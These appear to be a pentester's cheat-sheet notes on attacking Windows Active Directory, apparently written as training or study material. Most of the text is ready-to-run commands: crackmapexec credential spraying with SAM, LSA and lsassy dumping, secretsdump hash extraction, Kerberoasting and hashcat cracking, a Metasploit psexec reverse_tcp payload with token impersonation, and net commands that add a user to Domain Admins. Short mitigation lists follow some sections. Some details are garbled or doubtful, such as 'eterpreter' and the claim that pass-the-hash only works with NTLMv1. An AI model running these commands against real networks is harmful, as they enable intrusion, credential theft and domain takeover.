Pass the Password:
	`crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <password>
	you can add `--sam` to dump the account SAM
	you can add `--shares` to enumerate shares
	you can add `--lsa` to dump secrets
	you can add `-M lsassy` can dump cleartext passwords or hashes and other information
	`cmedb` brings you to the crackmapexec database

Pass the Hash:
	`crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth`
	This only works with NTLMv1
	all the same flags work here

Dumping/Cracking Hashes:
	`secretsdump.py <domain/user>:'<password>'@<ip>`
	This can dump hashes, and possibly cleartext passwords
	`secretsdump.py <domain/user>:@<ip> -hashes <hash>`
	after getting new users and hashes, respray the network with local accounts

Mitigation for Pass the Pass/Hash:
	Limit account re-use
	Use strong passwords
	Password Access Management


Kerberoasting:
	This attack focuses only on the domain controller
	`sudo GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc ip address> -request`
	throw hash in a text file
	`hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt <if on host OS, add -O>`
	Mitigation: Strong passwords, and least privilege

Token Impersonation:
	Delegate and Impersonate. Focusing on on Delegate
	`msfconsole`
	`search psexec`
	`use exploit/windows/smb/psexec`
	`set payload windows/x64/eterpreter/reverse_tcp`
	`set rhosts <target ip>
	`set smbuser <user>`
	`set smbpass <password>`
	`set smbdomain <domain>`
	`run`
	in meterpreter, do the following
	`load incognito`
	`list_tokens -u`
	`impersonate_token marvel\\<user>`
	`shell`
	To add user:
	`net user /add <user> <password> /domain`
	`net group "Domain Admins" <user> /ADD /DOMAIN`
	to undo impersonation, use `rev2self`
	use `secretsdump.py` on the DC using the new user

Token Impersonation Mitigation:
	Limit user/group token creation permissions
	account tiering
	local admin restriction


URL File Attacks:
	Send file from "Internet shortcut example" to machine
	On the attacker machine, open responder
	`responder -I eth0 -v`
	if target loads directory holding the file, hashes will be sent to responder


Mimikatz:
	Caught by most AVs
	mimikatz by gentillkiwi